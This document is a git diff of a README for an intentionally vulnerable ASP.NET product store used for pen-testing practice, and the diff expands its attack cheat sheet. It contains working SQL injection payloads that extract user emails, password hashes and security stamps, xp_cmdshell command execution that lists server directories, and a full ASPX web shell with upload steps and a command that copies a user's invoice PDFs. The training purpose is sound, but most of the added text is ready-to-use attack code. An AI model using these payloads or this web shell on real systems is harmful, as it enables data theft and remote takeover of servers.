@@ -2,6 +2,21 @@
 A simple product store with many unsafe features used for PEN testing.
 Based on the old Microsoft tutorial for MvcMusicStore found at https://docs.microsoft.com/en-us/aspnet/mvc/overview/older-versions/mvc-music-store/.
 
+## Playbook
+
+This is a walktrough of a path to discover the vulnerabilities of this web app.
+
+### Recon
+Start by running a nikto or sparta scan
+
+
+### Enumeration
+
+## Exploitation
+
+
+
+
 ## Cheat sheet
 
 ### Authorisation
@@ -65,13 +80,17 @@ Try if you can inject some code in the search field.
 Here are some examples that might get you started:
     ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
 	x' UNION SELECT 99, @@version, 'http://foo.gif' --
-    ' OR 1=1 UNION SELECT 99, system_user, 'http://foo.gif' --
-	' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' -- (all tables)
-    ' OR 1=1 UNION SELECT 99, DB_NAME(), 'http://foo.gif' --  (database name)
-    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases -- (all databases)    
-    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') -- (column names in table)
+    x' UNION SELECT 99, system_user, 'http://foo.gif' --
+	x' UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases -- (all databases)    
+	x' UNION SELECT 99, DB_NAME(), 'http://foo.gif' --  (database name)
+	x' UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' -- (all tables)    
+    
+    x' UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') -- (column names in table)
+	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT Email FROM AspNetUsers) AS C -- (get emails)
+	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT PasswordHash FROM AspNetUsers) AS C -- (get PasswordHash)
+	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT SecurityStamp FROM AspNetUsers) AS C -- (get SecurityStamp)
 
-	Error based injection (will dispkay server error)
+	Error based injection (will display server error)
 	x' AND 1 IN (SELECT @@version) --
 	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT 1) as varchar(4096))) -- (replace select statement with the sql you want to execute)
 	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 Email FROM Orders) as varchar(4096))) --
@@ -101,12 +120,13 @@ Here are some examples that might get you started:
 	You can create a table and store the output of a command to it with the following:
 
 	; create table #output (id int identity(1,1), output nvarchar(255) null);
-	; insert #output (output) exec @rc = master..xp_cmdshell 'dir c:';
+	; insert #output (output) exec @rc = master..xp_cmdshell 'dir c:\';
 	; select * from #output where output is not null order by id;
 
-	Example
+	Example create new table and dump contents of c drive to table
 	x'; create table hacker (id int identity(1,1), output nvarchar(255) null); --
-	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir c:'; --		
+	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir c:\'; --		
+	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir C:\Users\jrn\Desktop'; --			
 	x' union select 99, output, 'http://foo.gif' from hacker where output is not null --
 	x'; drop table hacker --
 
@@ -123,11 +143,33 @@ Here are some examples that might get you started:
 Customer service page has upload functionality which saves files in Uploads folder. Could be exploited for 
 reverse shell upload. Seems like anything can be uploaded and directory browsing is enabled.
 
-
-### Exploitation
 If we can get access to the server it's easy to upload your own shell code and have the website execute it.
-There is a Shell method in the StoreManager controller /StoreManager/Shell. Check it out. 
+
+Try creating a file called shell.aspx with this content
+
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+
+<%= 
+    Process.Start(new ProcessStartInfo("cmd","/c " + Request["c"])
+                    {
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true
+                    }).StandardOutput.ReadToEnd()    
+    
+    %>
+	
+	Upload it to contact us page as attachment shell.aspx.
+
+Then type 
+http://localhost:50881/Uploads/shell.aspx?copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads
+
+Then check content of Uploads directory.
+
+If the above fails then there is a Shell method in the StoreManager controller /StoreManager/Shell. Check it out. 
 Also another shell in the root /shell.aspx?c="COMMAND HERE". 
+
+
 
 #### Usefull commands:
 net localgroup Users
